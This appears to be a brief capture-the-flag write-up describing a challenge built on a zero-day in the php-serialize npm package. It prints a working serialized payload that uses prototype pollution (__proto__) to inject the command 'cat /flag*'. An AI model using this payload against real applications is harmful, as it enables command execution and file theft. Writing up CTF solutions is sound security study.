
## Zero Day Info

This challenge takes advantage of an undisclosed (at the time of the competition) zero day vulnerability on the `php-serialize` [npm package](https://www.npmjs.com/package/php-serialize). But is also had an unintended solution using a prototype pollution.

## Exploit

Example payload from one of the first solvers (feasto), using the unintended:
```
O:7:"Command":2:{s:3:"sig";s:64:"5f05044907877d170b1cff58710866ed020b7bbaa71e65d1c73fe8ddaec26f77";s:6:"params";a:2:{s:4:"path";s:15:"/app/server.log";s:9:"__proto__";a:1:{s:3:"cmd";s:10:"cat /flag*";}}}
```

(it has to be base64 encoded)
